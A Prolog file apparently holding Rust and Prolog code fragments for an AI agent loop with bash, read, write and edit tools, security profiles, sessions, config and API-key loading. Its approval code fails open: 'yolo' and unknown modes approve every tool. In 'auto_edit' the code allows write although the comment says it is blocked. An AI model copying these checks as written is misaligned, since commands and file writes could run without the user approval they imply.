impl AgentBackend for ApiBackend {
    fn send_message(&self, message: &str, context: &[Message]) -> AgentResponse {
        let client = reqwest::blocking::Client::new();
        let mut body = self.build_request_body(message, context);

        if self.stream {
            body["stream"] = serde_json::json!(true);
            let (content, input_tokens, output_tokens) = send_streaming(
                &client,
                &self.endpoint,
                self.api_key.as_deref(),
                body,
            );
            return AgentResponse {
                content,
                input_tokens,
                output_tokens,
                model: self.model.clone(),
                ..Default::default()
            };
        }

        let req = client.post(&self.endpoint)
            .header("Content-Type", "application/json");
        let req = self.add_auth_header(req);

        match req.json(&body).send() {
            Ok(resp) => {
                match resp.json::<serde_json::Value>() {
                    Ok(json) => self.parse_response(json),
                    Err(e) => AgentResponse {
                        content: format!("JSON parse error: {}", e),
                        model: self.model.clone(),
                        ..Default::default()
                    },
                }
            }
            Err(e) => AgentResponse {
                content: format!("HTTP error: {}", e),
                model: self.model.clone(),
                ..Default::default()
            },
        }
    }

    fn name(&self) -> &str { &self.backend_name }
    fn supports_streaming(&self) -> bool { true }
}

').

rust_fragment(tool_handler_struct, '
use crate::security::SecurityProfileSpec;

/// Handles tool execution with security validation.
pub struct ToolHandler {
    pub auto_approve: bool,
    pub security_profile: String,
    pub approval_mode: String,
}

impl ToolHandler {
    pub fn new(auto_approve: bool, security_profile: String, approval_mode: String) -> Self {
        Self { auto_approve, security_profile, approval_mode }
    }

    /// Look up the SecurityProfileSpec for the current profile.
    fn get_profile_spec(&self) -> Option<&''static SecurityProfileSpec> {
        use crate::security::SECURITY_PROFILES;
        SECURITY_PROFILES.iter()
            .find(|(name, _)| *name == self.security_profile)
            .map(|(_, spec)| spec)
    }
}

').

rust_fragment(tool_handler_validation, '
impl ToolHandler {
    /// Check if a path is allowed by security rules.
    /// Respects security_profile: "open" skips all checks.
    pub fn check_path_allowed(&self, path: &str) -> bool {
        use crate::security::*;

        // Open profile skips all path checks
        if let Some(spec) = self.get_profile_spec() {
            if !spec.path_validation {
                return true;
            }
        }

        // Check exact blocked paths
        for blocked in BLOCKED_PATHS.iter() {
            if path == *blocked {
                return false;
            }
        }

        // Check blocked prefixes
        for prefix in BLOCKED_PATH_PREFIXES.iter() {
            if path.starts_with(prefix) {
                return false;
            }
        }

        // Check home directory patterns
        if let Some(home) = std::env::var_os("HOME") {
            let home = home.to_string_lossy();
            for pattern in BLOCKED_HOME_PATTERNS.iter() {
                let blocked_path = format!("{}/{}", home, pattern);
                if path.starts_with(&blocked_path) {
                    return false;
                }
            }
        }

        true
    }

    /// Check if a command matches any blocked patterns.
    /// Respects security_profile: "open" skips checks, "guarded" adds extra blocks,
    /// "paranoid" uses allowlist-only mode.
    pub fn is_command_blocked(&self, command: &str) -> Option<String> {
        use crate::security::*;

        // Open profile skips all command checks
        if let Some(spec) = self.get_profile_spec() {
            if !spec.command_validation {
                return None;
            }
        }

        // Paranoid mode: allowlist-only (safe + confirm patterns)
        if self.security_profile == "paranoid" {
            let is_safe = PARANOID_SAFE.iter().any(|pat| {
                regex::Regex::new(pat).map(|re| re.is_match(command)).unwrap_or(false)
            });
            let is_confirm = PARANOID_CONFIRM.iter().any(|pat| {
                regex::Regex::new(pat).map(|re| re.is_match(command)).unwrap_or(false)
            });
            if !is_safe && !is_confirm {
                return Some("Command not in paranoid allowlist".to_string());
            }
            return None;
        }

        // Standard blocked command patterns (cautious + guarded)
        for (pattern, description) in BLOCKED_COMMAND_PATTERNS.iter() {
            if let Ok(re) = regex::Regex::new(pattern) {
                if re.is_match(command) {
                    return Some(description.to_string());
                }
            }
        }

        // Guarded mode: additional blocked patterns
        if self.security_profile == "guarded" {
            for pattern in GUARDED_EXTRA_BLOCKS.iter() {
                if let Ok(re) = regex::Regex::new(pattern) {
                    if re.is_match(command) {
                        return Some(format!("Blocked by guarded profile: {}", pattern));
                    }
                }
            }
        }

        None
    }

    /// Check if a tool requires approval based on approval_mode.
    /// Returns true if the tool is approved to execute, false if blocked.
    pub fn check_approval(&self, tool_name: &str) -> bool {
        match self.approval_mode.as_str() {
            "yolo" => true,
            "plan" => {
                // Plan mode: only read is allowed
                matches!(tool_name, "read")
            }
            "auto_edit" => {
                // Auto-approve read and edit, block bash and write
                matches!(tool_name, "read" | "edit" | "write")
            }
            "default" => {
                if self.auto_approve {
                    return true;
                }
                // Read is always auto-approved
                if tool_name == "read" {
                    return true;
                }
                // For other tools, prompt user
                eprint!("  Allow {} tool? [y/N] ", tool_name);
                let mut input = String::new();
                if std::io::stdin().read_line(&mut input).is_ok() {
                    input.trim().eq_ignore_ascii_case("y")
                } else {
                    false
                }
            }
            _ => true,
        }
    }
}

').

rust_fragment(tool_handler_dispatch, '
impl ToolHandler {
    /// Execute a tool call and return the result.
    pub fn execute(&self, tool_call: &ToolCall) -> ToolResult {
        // Check approval mode before executing
        if !self.check_approval(&tool_call.name) {
            return ToolResult {
                success: false,
                output: format!("Tool ''{}'' blocked by approval mode ''{}''", tool_call.name, self.approval_mode),
                tool_name: tool_call.name.clone(),
            };
        }

        match tool_call.name.as_str() {
            "bash" => self.handle_bash(&tool_call.arguments),
            "read" => self.handle_read(&tool_call.arguments),
            "write" => self.handle_write(&tool_call.arguments),
            "edit" => self.handle_edit(&tool_call.arguments),
            _ => ToolResult {
                success: false,
                output: format!("Unknown tool: {}", tool_call.name),
                tool_name: tool_call.name.clone(),
            },
        }
    }

    fn handle_bash(&self, args: &std::collections::HashMap<String, serde_json::Value>) -> ToolResult {
        let command = args.get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        if let Some(reason) = self.is_command_blocked(command) {
            return ToolResult {
                success: false,
                output: format!("Command blocked: {}", reason),
                tool_name: "bash".to_string(),
            };
        }

        match Command::new("bash").arg("-c").arg(command)
            .stdout(Stdio::piped()).stderr(Stdio::piped()).output()
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = if stderr.is_empty() {
                    stdout.to_string()
                } else {
                    format!("{}\n{}", stdout, stderr)
                };
                ToolResult {
                    success: output.status.success(),
                    output: combined,
                    tool_name: "bash".to_string(),
                }
            }
            Err(e) => ToolResult {
                success: false,
                output: format!("Error: {}", e),
                tool_name: "bash".to_string(),
            },
        }
    }

    fn handle_read(&self, args: &std::collections::HashMap<String, serde_json::Value>) -> ToolResult {
        let path = args.get("file_path")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        if !self.check_path_allowed(path) {
            return ToolResult {
                success: false,
                output: format!("Path blocked: {}", path),
                tool_name: "read".to_string(),
            };
        }

        match std::fs::read_to_string(path) {
            Ok(content) => ToolResult {
                success: true,
                output: content,
                tool_name: "read".to_string(),
            },
            Err(e) => ToolResult {
                success: false,
                output: format!("Error reading {}: {}", path, e),
                tool_name: "read".to_string(),
            },
        }
    }

    fn handle_write(&self, args: &std::collections::HashMap<String, serde_json::Value>) -> ToolResult {
        let path = args.get("file_path")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let content = args.get("content")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        if !self.check_path_allowed(path) {
            return ToolResult {
                success: false,
                output: format!("Path blocked: {}", path),
                tool_name: "write".to_string(),
            };
        }

        match std::fs::write(path, content) {
            Ok(()) => ToolResult {
                success: true,
                output: format!("Wrote {} bytes to {}", content.len(), path),
                tool_name: "write".to_string(),
            },
            Err(e) => ToolResult {
                success: false,
                output: format!("Error writing {}: {}", path, e),
                tool_name: "write".to_string(),
            },
        }
    }

    fn handle_edit(&self, args: &std::collections::HashMap<String, serde_json::Value>) -> ToolResult {
        let path = args.get("file_path")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let old_string = args.get("old_string")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let new_string = args.get("new_string")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        if !self.check_path_allowed(path) {
            return ToolResult {
                success: false,
                output: format!("Path blocked: {}", path),
                tool_name: "edit".to_string(),
            };
        }

        match std::fs::read_to_string(path) {
            Ok(content) => {
                if !content.contains(old_string) {
                    return ToolResult {
                        success: false,
                        output: "old_string not found in file".to_string(),
                        tool_name: "edit".to_string(),
                    };
                }
                let new_content = content.replacen(old_string, new_string, 1);
                match std::fs::write(path, &new_content) {
                    Ok(()) => ToolResult {
                        success: true,
                        output: format!("Edited {}", path),
                        tool_name: "edit".to_string(),
                    },
                    Err(e) => ToolResult {
                        success: false,
                        output: format!("Error writing {}: {}", path, e),
                        tool_name: "edit".to_string(),
                    },
                }
            }
            Err(e) => ToolResult {
                success: false,
                output: format!("Error reading {}: {}", path, e),
                tool_name: "edit".to_string(),
            },
        }
    }
}

').

%% --- Fragment: sessions_module (sessions.rs) ---

rust_fragment(sessions_module, '
use std::path::{Path, PathBuf};
use std::fs;
use serde::{Serialize, Deserialize};
use crate::types::Message;

/// Session metadata for listing/display.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionMetadata {
    pub id: String,
    pub name: String,
    pub created: String,
    pub modified: String,
    pub backend: String,
    pub message_count: usize,
}

/// Persisted session with messages and metadata.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistedSession {
    pub metadata: SessionMetadata,
    pub messages: Vec<Message>,
}

/// Session manager for save/load/list/delete of conversation sessions.
pub struct SessionManager {
    pub sessions_dir: PathBuf,
}

impl SessionManager {
    pub fn new(dir: Option<&str>) -> Self {
        let sessions_dir = match dir {
            Some(d) => PathBuf::from(d),
            None => {
                let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
                PathBuf::from(home).join(".agent-loop").join("sessions")
            }
        };
        if !sessions_dir.exists() {
            let _ = fs::create_dir_all(&sessions_dir);
        }
        SessionManager { sessions_dir }
    }

    /// Save a session. Returns the session ID.
    pub fn save(&self, messages: &[Message], backend: &str, name: Option<&str>) -> String {
        let id = format!("{}", chrono_simple_id());
        let now = now_iso8601();
        let session_name = name.unwrap_or("unnamed").to_string();
        let meta = SessionMetadata {
            id: id.clone(),
            name: session_name,
            created: now.clone(),
            modified: now,
            backend: backend.to_string(),
            message_count: messages.len(),
        };
        let session = PersistedSession {
            metadata: meta,
            messages: messages.to_vec(),
        };
        let path = self.sessions_dir.join(format!("{}.json", id));
        if let Ok(json) = serde_json::to_string_pretty(&session) {
            let _ = fs::write(&path, json);
        }
        id
    }

    /// Load a session by ID. Returns messages and metadata.
    pub fn load(&self, id: &str) -> Option<PersistedSession> {
        let path = self.sessions_dir.join(format!("{}.json", id));
        if !path.exists() {
            // Try prefix match
            if let Some(full_path) = self.find_by_prefix(id) {
                return self.load_file(&full_path);
            }
            return None;
        }
        self.load_file(&path)
    }

    fn load_file(&self, path: &Path) -> Option<PersistedSession> {
        let content = fs::read_to_string(path).ok()?;
        serde_json::from_str(&content).ok()
    }

    fn find_by_prefix(&self, prefix: &str) -> Option<PathBuf> {
        let entries = fs::read_dir(&self.sessions_dir).ok()?;
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with(prefix) && name.ends_with(".json") {
                return Some(entry.path());
            }
        }
        None
    }

    /// List all saved sessions sorted by modification time.
    pub fn list(&self) -> Vec<SessionMetadata> {
        let mut sessions = Vec::new();
        if let Ok(entries) = fs::read_dir(&self.sessions_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.extension().map_or(false, |e| e == "json") {
                    if let Some(session) = self.load_file(&path) {
                        sessions.push(session.metadata);
                    }
                }
            }
        }
        sessions.sort_by(|a, b| b.modified.cmp(&a.modified));
        sessions
    }

    /// Delete a session by ID. Returns true if deleted.
    pub fn delete(&self, id: &str) -> bool {
        let path = self.sessions_dir.join(format!("{}.json", id));
        if path.exists() {
            return fs::remove_file(&path).is_ok();
        }
        if let Some(full_path) = self.find_by_prefix(id) {
            return fs::remove_file(&full_path).is_ok();
        }
        false
    }
}

/// Simple timestamp-based session ID.
fn chrono_simple_id() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let dur = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    format!("{:x}{:04x}", dur.as_secs(), dur.subsec_millis())
}

/// ISO 8601 timestamp.
fn now_iso8601() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let dur = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    let secs = dur.as_secs();
    // Simple UTC timestamp
    let days = secs / 86400;
    let time_of_day = secs % 86400;
    let hours = time_of_day / 3600;
    let minutes = (time_of_day % 3600) / 60;
    let seconds = time_of_day % 60;
    // Approximate date calculation (not leap-second accurate, good enough for IDs)
    let mut year = 1970u64;
    let mut remaining_days = days;
    loop {
        let days_in_year = if year % 4 == 0 && (year % 100 != 0 || year % 400 == 0) { 366 } else { 365 };
        if remaining_days < days_in_year { break; }
        remaining_days -= days_in_year;
        year += 1;
    }
    let leap = year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
    let month_days = [31, if leap { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut month = 0u64;
    for &md in &month_days {
        if remaining_days < md { break; }
        remaining_days -= md;
        month += 1;
    }
    format!("{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z", year, month + 1, remaining_days + 1, hours, minutes, seconds)
}
').

rust_fragment(streaming_handler, '
use std::io::{BufRead, Write};

/// Parse a single SSE event line.
/// Returns the data payload if the line starts with "data: ", or None.
pub fn parse_sse_line(line: &str) -> Option<String> {
    let trimmed = line.trim();
    if trimmed == "data: [DONE]" {
        return None;
    }
    if let Some(data) = trimmed.strip_prefix("data: ") {
        Some(data.to_string())
    } else {
        None
    }
}

/// Extract content delta from an SSE JSON payload.
/// Supports OpenAI/OpenRouter format (choices[0].delta.content)
/// and Anthropic format (delta.text).
pub fn extract_content_delta(json_str: &str) -> Option<String> {
    let json: serde_json::Value = serde_json::from_str(json_str).ok()?;
    // OpenAI / OpenRouter format
    if let Some(content) = json.get("choices")
        .and_then(|c| c.get(0))
        .and_then(|c| c.get("delta"))
        .and_then(|d| d.get("content"))
        .and_then(|c| c.as_str()) {
        return Some(content.to_string());
    }
    // Anthropic format
    if let Some(text) = json.get("delta")
        .and_then(|d| d.get("text"))
        .and_then(|t| t.as_str()) {
        return Some(text.to_string());
    }
    None
}

/// Send a streaming request and print output progressively.
/// Returns the complete accumulated response content and token usage.
pub fn send_streaming(
    client: &reqwest::blocking::Client,
    endpoint: &str,
    api_key: Option<&str>,
    body: serde_json::Value,
) -> (String, u64, u64) {
    let mut req = client.post(endpoint)
        .header("Content-Type", "application/json");
    if let Some(key) = api_key {
        req = req.header("Authorization", format!("Bearer {}", key));
    }

    match req.json(&body).send() {
        Ok(resp) => {
            let mut full_content = String::new();
            let reader = std::io::BufReader::new(resp);
            for line in reader.lines() {
                match line {
                    Ok(line) => {
                        if let Some(data) = parse_sse_line(&line) {
                            if let Some(delta) = extract_content_delta(&data) {
                                print!("{}", delta);
                                let _ = std::io::stdout().flush();
                                full_content.push_str(&delta);
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
            println!();
            (full_content, 0, 0)
        }
        Err(e) => {
            (format!("Streaming error: {}", e), 0, 0)
        }
    }
}
').

rust_fragment(config_loader_types, '
use std::collections::HashMap;
use crate::config::*;
use crate::types::AgentConfig;

/// Represents a loaded configuration file (agents.yaml/json).
#[derive(Debug, Clone, Default)]
pub struct ConfigFile {
    /// Default backend for all agents
    pub default_backend: Option<String>,
    /// API keys section (backend_name -> key)
    pub keys: HashMap<String, String>,
    /// Named agent variants
    pub agents: HashMap<String, AgentVariant>,
}

/// A named agent variant from config file.
#[derive(Debug, Clone, Default)]
pub struct AgentVariant {
    pub backend: Option<String>,
    pub model: Option<String>,
    pub host: Option<String>,
    pub port: Option<i64>,
    pub api_key: Option<String>,
    pub command: Option<String>,
    pub system_prompt: Option<String>,
    pub agent_md: Option<String>,
    pub tools: Option<Vec<String>>,
    pub auto_tools: Option<bool>,
    pub context_mode: Option<String>,
    pub max_context_tokens: Option<i64>,
    pub max_messages: Option<i64>,
    pub skills: Option<Vec<String>>,
    pub max_iterations: Option<i64>,
    pub timeout: Option<i64>,
    pub extra: Option<HashMap<String, serde_json::Value>>,
}
').

rust_fragment(config_loader_cascade, '
/// Expand ~ to home directory.
pub fn expand_home(path: &str) -> String {
    if path.starts_with("~/") {
        if let Ok(home) = std::env::var("HOME") {
            return format!("{}{}", home, &path[1..]);
        }
    }
    path.to_string()
}

/// Find a config file by searching CONFIG_SEARCH_PATHS and CONFIG_DIR_FILE_NAMES.
/// Returns the path if found.
pub fn find_config_file(cli_config: Option<&str>, no_fallback: bool) -> Option<String> {
    // CLI --config overrides everything
    if let Some(path) = cli_config {
        let expanded = expand_home(path);
        if std::path::Path::new(&expanded).exists() {
            return Some(expanded);
        }
        eprintln!("Config file not found: {}", path);
        return None;
    }
    // Search config_search_path entries
    for csp in CONFIG_SEARCH_PATHS {
        if no_fallback && csp.priority == "fallback" {
            continue;
        }
        let expanded = expand_home(csp.path);
        if std::path::Path::new(&expanded).exists() {
            return Some(expanded);
        }
        // Check for config dir files next to each search path
        let parent = std::path::Path::new(&expanded)
            .parent()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|| ".".to_string());
        for fname in CONFIG_DIR_FILE_NAMES {
            let candidate = format!("{}/{}", parent, fname);
            if std::path::Path::new(&candidate).exists() {
                return Some(candidate);
            }
        }
    }
    None
}

/// Load and parse a config file (JSON or YAML format).
/// Format is detected by file extension: .yaml/.yml → YAML, otherwise JSON.
pub fn load_config_file(path: &str) -> Option<ConfigFile> {
    let content = std::fs::read_to_string(path).ok()?;
    let json: serde_json::Value = if path.ends_with(".yaml") || path.ends_with(".yml") {
        serde_yaml::from_str(&content).ok()?
    } else {
        serde_json::from_str(&content).ok()?
    };

    let mut cf = ConfigFile::default();

    // Parse default backend
    cf.default_backend = json.get("default_backend")
        .or_else(|| json.get("backend"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    // Parse keys
    if let Some(keys_obj) = json.get("keys").and_then(|v| v.as_object()) {
        for (k, v) in keys_obj {
            if let Some(val) = v.as_str() {
                cf.keys.insert(k.clone(), val.to_string());
            }
        }
    }

    // Parse agents
    if let Some(agents_obj) = json.get("agents").and_then(|v| v.as_object()) {
        for (name, agent_val) in agents_obj {
            let variant = parse_agent_variant(agent_val);
            cf.agents.insert(name.clone(), variant);
        }
    }

    Some(cf)
}

fn parse_agent_variant(val: &serde_json::Value) -> AgentVariant {
    let mut v = AgentVariant::default();
    v.backend = val.get("backend").and_then(|x| x.as_str()).map(|s| s.to_string());
    v.model = val.get("model").and_then(|x| x.as_str()).map(|s| s.to_string());
    v.host = val.get("host").and_then(|x| x.as_str()).map(|s| s.to_string());
    v.port = val.get("port").and_then(|x| x.as_i64());
    v.api_key = val.get("api_key").and_then(|x| x.as_str()).map(|s| s.to_string());
    v.command = val.get("command").and_then(|x| x.as_str()).map(|s| s.to_string());
    v.system_prompt = val.get("system_prompt").and_then(|x| x.as_str()).map(|s| s.to_string());
    v.agent_md = val.get("agent_md").and_then(|x| x.as_str()).map(|s| s.to_string());
    v.auto_tools = val.get("auto_tools").and_then(|x| x.as_bool());
    v.context_mode = val.get("context_mode").and_then(|x| x.as_str()).map(|s| s.to_string());
    v.max_context_tokens = val.get("max_context_tokens").and_then(|x| x.as_i64());
    v.max_messages = val.get("max_messages").and_then(|x| x.as_i64());
    v.max_iterations = val.get("max_iterations").and_then(|x| x.as_i64());
    v.timeout = val.get("timeout").and_then(|x| x.as_i64());
    if let Some(arr) = val.get("tools").and_then(|x| x.as_array()) {
        v.tools = Some(arr.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect());
    }
    if let Some(arr) = val.get("skills").and_then(|x| x.as_array()) {
        v.skills = Some(arr.iter().filter_map(|x| x.as_str().map(|s| s.to_string())).collect());
    }
    v
}
').

rust_fragment(config_loader_agent_resolve, '
/// Resolve an agent variant to an AgentConfig.
/// Priority: config file agent → default preset → default config.
pub fn resolve_agent(
    agent_name: Option<&str>,
    config_file: Option<&ConfigFile>,
) -> AgentConfig {
    let mut config = AgentConfig::default();

    if let Some(name) = agent_name {
        // Try config file first
        if let Some(cf) = config_file {
            if let Some(variant) = cf.agents.get(name) {
                apply_variant_to_config(&mut config, variant, cf);
                config.name = name.to_string();
                return config;
            }
        }
        // Try default presets
        if let Some(preset) = DEFAULT_PRESETS.iter().find(|p| p.name == name) {
            config.backend = preset.backend.to_string();
            config.name = name.to_string();
            parse_preset_overrides(&mut config, preset.overrides);
            return config;
        }
        eprintln!("Warning: agent ''{}'' not found, using default", name);
    } else if let Some(cf) = config_file {
        // Apply default_backend from config file
        if let Some(ref db) = cf.default_backend {
            config.backend = db.clone();
        }
    }

    config
}

fn apply_variant_to_config(config: &mut AgentConfig, variant: &AgentVariant, cf: &ConfigFile) {
    if let Some(ref v) = variant.backend { config.backend = v.clone(); }
    if let Some(ref v) = variant.model { config.model = Some(v.clone()); }
    if let Some(ref v) = variant.host { config.host = Some(v.clone()); }
    if let Some(ref v) = variant.port { config.port = Some(*v); }
    if let Some(ref v) = variant.api_key { config.api_key = Some(v.clone()); }
    if let Some(ref v) = variant.command { config.command = Some(v.clone()); }
    if let Some(ref v) = variant.system_prompt { config.system_prompt = Some(v.clone()); }
    if let Some(ref v) = variant.agent_md { config.agent_md = Some(v.clone()); }
    if let Some(ref v) = variant.tools { config.tools = v.clone(); }
    if let Some(v) = variant.auto_tools { config.auto_tools = v; }
    if let Some(ref v) = variant.context_mode { config.context_mode = v.clone(); }
    if let Some(v) = variant.max_context_tokens { config.max_context_tokens = v; }
    if let Some(v) = variant.max_messages { config.max_messages = v; }
    if let Some(v) = variant.max_iterations { config.max_iterations = v; }
    if let Some(v) = variant.timeout { config.timeout = v; }
    if let Some(ref v) = variant.skills { config.skills = v.clone(); }
    // Apply default_backend from config file if variant has no backend
    if variant.backend.is_none() {
        if let Some(ref db) = cf.default_backend {
            config.backend = db.clone();
        }
    }
}

fn parse_preset_overrides(config: &mut AgentConfig, overrides_str: &str) {
    // Format: [key=value,key=value,...]
    let inner = overrides_str.trim_start_matches(\'[\').trim_end_matches(\']\');
    for pair in inner.split(\',\') {
        let pair = pair.trim();
        if let Some(eq_pos) = pair.find(\'=\') {
            let key = pair[..eq_pos].trim();
            let val = pair[eq_pos+1..].trim().trim_matches(\'\\\"\').trim_matches(\'\\\'\');
            match key {
                "model" => config.model = Some(val.to_string()),
                "host" => config.host = Some(val.to_string()),
                "command" => config.command = Some(val.to_string()),
                "system_prompt" => config.system_prompt = Some(val.to_string()),
                "auto_tools" => config.auto_tools = val == "true",
                "context_mode" => config.context_mode = val.to_string(),
                "port" => if let Ok(p) = val.parse() { config.port = Some(p); },
                "max_iterations" => if let Ok(n) = val.parse() { config.max_iterations = n; },
                "max_context_tokens" => if let Ok(n) = val.parse() { config.max_context_tokens = n; },
                _ => {}
            }
        }
    }
}
').

rust_fragment(config_loader_api_key_resolve, '
/// Resolve API key from multiple sources.
/// Priority: CLI → env var → config file keys → key file on disk.
pub fn resolve_api_key(config: &mut AgentConfig, config_file: Option<&ConfigFile>) {
    // Already set from CLI
    if config.api_key.is_some() {
        // Check if it is an env var reference ($VAR_NAME)
        if let Some(ref key) = config.api_key.clone() {
            if key.starts_with(\'$\') {
                let var_name = &key[1..];
                if let Ok(val) = std::env::var(var_name) {
                    config.api_key = Some(val);
                    return;
                }
            }
        }
        return;
    }

    // Try env vars from API_KEY_ENV_VARS
    for mapping in API_KEY_ENV_VARS {
        if mapping.backend == config.backend {
            if let Ok(val) = std::env::var(mapping.env_var) {
                config.api_key = Some(val);
                return;
            }
        }
    }

    // Try config file keys section
    if let Some(cf) = config_file {
        if let Some(key) = cf.keys.get(&config.backend) {
            if key.starts_with(\'$\') {
                let var_name = &key[1..];
                if let Ok(val) = std::env::var(var_name) {
                    config.api_key = Some(val);
                    return;
                }
            } else {
                config.api_key = Some(key.clone());
                return;
            }
        }
    }

    // Try key files on disk
    for file_path in API_KEY_FILE_PATHS {
        if file_path.backend == config.backend {
            let expanded = expand_home(file_path.file_path);
            if let Ok(content) = std::fs::read_to_string(&expanded) {
                let trimmed = content.trim().to_string();
                if !trimmed.is_empty() {
                    config.api_key = Some(trimmed);
                    return;
                }
            }
        }
    }
}
').

rust_fragment(config_loader_list_agents, '
/// List available agents from config file and default presets.
pub fn list_agents(config_file: Option<&ConfigFile>) {
    println!("Available agents:");
    println!();

    // Config file agents
    if let Some(cf) = config_file {
        if !cf.agents.is_empty() {
            println!("  From config file:");
            let mut names: Vec<&String> = cf.agents.keys().collect();
            names.sort();
            for name in names {
                let variant = &cf.agents[name];
                let backend = variant.backend.as_deref().unwrap_or("(default)");
                let model = variant.model.as_deref().unwrap_or("");
                if model.is_empty() {
                    println!("    {:<20} backend={}", name, backend);
                } else {
                    println!("    {:<20} backend={}, model={}", name, backend, model);
                }
            }
            println!();
        }
    }

    // Default presets
    println!("  Built-in presets:");
    for preset in DEFAULT_PRESETS {
        println!("    {:<20} backend={} {}", preset.name, preset.backend, preset.overrides);
    }
}

/// Generate an example config file (JSON or YAML based on extension).
pub fn init_config(path: &str) -> std::io::Result<()> {
    let content = if path.ends_with(".yaml") || path.ends_with(".yml") {
        generate_example_config_yaml()
    } else {
        generate_example_config()
    };
    std::fs::write(path, content)?;
    println!("Created example config: {}", path);
    Ok(())
}
').

rust_fragment(main_loop, '
    let backend = create_backend(&config);
    let mut context = ContextManager::new(
        config.max_messages as usize,
        config.max_context_tokens,
        config.max_chars,
        config.max_words,
        &config.context_mode,
    );
    let mut cost_tracker = CostTracker::new();
    let tool_handler = ToolHandler::new(config.auto_tools, config.security_profile.clone(), config.approval_mode.clone());

    // Restore initial context from --session if any
    for msg in &initial_context {
        context.add_message(&msg.role, &msg.content);
    }

    // Single-prompt non-interactive mode
    if let Some(prompt) = matches.get_one::<String>("prompt") {
        context.add_message("user", prompt);
        let response = backend.send_message(prompt, context.get_context());
        if !response.content.is_empty() {
            println!("{}", response.content);
        }
        cost_tracker.record_usage(&response.model, response.input_tokens, response.output_tokens);
        if config.show_tokens {
            println!("  {}", cost_tracker.format_summary());
        }
        return;
    }

    let mut rl = rustyline::DefaultEditor::new().expect("Failed to initialize readline");

    // Handle --prompt-interactive: inject initial prompt
    let mut initial_prompt = matches.get_one::<String>("prompt_interactive").cloned();

    println!("UnifyWeaver Agent Loop ({})", backend.name());
    println!("Type /help for commands, /exit to quit.\\n");

    loop {
        let readline = if let Some(p) = initial_prompt.take() {
            Ok(p)
        } else {
            rl.readline(">>> ")
        };
        match readline {
            Ok(line) => {
                let input = line.trim();
                if input.is_empty() { continue; }
                let _ = rl.add_history_entry(input);

                // Handle slash commands
                if input.starts_with(''/'' ) {
                    let handled = handle_command(input, &mut context, &cost_tracker, &session_manager, backend.name());
                    if handled { continue; }
                }

                // Process message
                context.add_message("user", input);
                let mut iterations = 0;
                let max_iter = config.max_iterations;

                loop {
                    let response = backend.send_message(input, context.get_context());

                    if !response.content.is_empty() {
                        println!("\\n{}", response.content);
                    }
                    cost_tracker.record_usage(&response.model, response.input_tokens, response.output_tokens);

                    if response.tool_calls.is_empty() {
                        context.add_message("assistant", &response.content);
                        break;
                    }

                    // Handle tool calls
                    context.add_tool_call_message(&response.content, response.tool_calls.clone());
                    for tc in &response.tool_calls {
                        println!("  [tool: {}]", tc.name);
                        let result = tool_handler.execute(tc);
                        println!("  {}", if result.success { "OK" } else { "FAIL" });
                        context.add_tool_result(&tc.id, &result.output);
                    }

                    iterations += 1;
                    if max_iter > 0 && iterations >= max_iter as usize {
                        println!("  [iteration limit reached]");
                        break;
                    }
                }

                if config.show_tokens {
                    println!("  {}", cost_tracker.format_summary());
                }
            }
            Err(rustyline::error::ReadlineError::Interrupted) |
            Err(rustyline::error::ReadlineError::Eof) => {
                // Auto-save on exit
                if context.len() > 0 {
                    let id = session_manager.save(context.get_messages(), backend.name(), None);
                    println!("Session saved: {}", id);
                }
                println!("Goodbye!");
                break;
            }
            Err(e) => {
                eprintln!("Error: {}", e);
                break;
            }
        }
    }
').

%% --- Fragment: cost_tracker_impl (costs.pl) ---

prolog_fragment(cost_tracker_impl, '
%% Cost tracker using dynamic state
:- dynamic cost_state/3.  %% cost_state(TrackerID, TotalInputTokens, TotalOutputTokens)

cost_tracker_init(ID) :-
    retractall(cost_state(ID, _, _)),
    assert(cost_state(ID, 0, 0)).

cost_tracker_add(ID, Model, InputTokens, OutputTokens) :-
    retract(cost_state(ID, OldIn, OldOut)),
    NewIn is OldIn + InputTokens,
    NewOut is OldOut + OutputTokens,
    assert(cost_state(ID, NewIn, NewOut)),
    (model_pricing(Model, InPrice, OutPrice) ->
        Cost is (InputTokens * InPrice + OutputTokens * OutPrice) / 1000000,
        format("  [cost: $~4f (~w in, ~w out)]~n", [Cost, InputTokens, OutputTokens])
    ; true).

cost_tracker_total(ID, Total) :-
    cost_state(ID, TotalIn, TotalOut),
    Total = tokens(TotalIn, TotalOut).

cost_tracker_format(ID, Formatted) :-
    cost_state(ID, TotalIn, TotalOut),
    format(atom(Formatted), "~w input, ~w output tokens", [TotalIn, TotalOut]).
').

%% --- Fragment: config_parse_cli (config.pl) ---

prolog_fragment(config_parse_cli, '%% Parse CLI arguments using SWI-Prolog optparse
parse_cli_args(Argv, Options) :-
    build_opt_spec(Spec),
    opt_parse(Spec, Argv, Options, _Positional).

build_opt_spec(Spec) :-
    findall(OptSpec, (
        cli_argument(Name, Props),
        member(long(Long), Props),
        atom_concat(''--'', OptName, Long),
        build_one_opt(Name, OptName, Props, OptSpec)
    ), Spec).

build_one_opt(Name, OptName, Props, opt(OptName, Name, Type, Help)) :-
    (member(type(int), Props) -> Type = integer ; Type = atom),
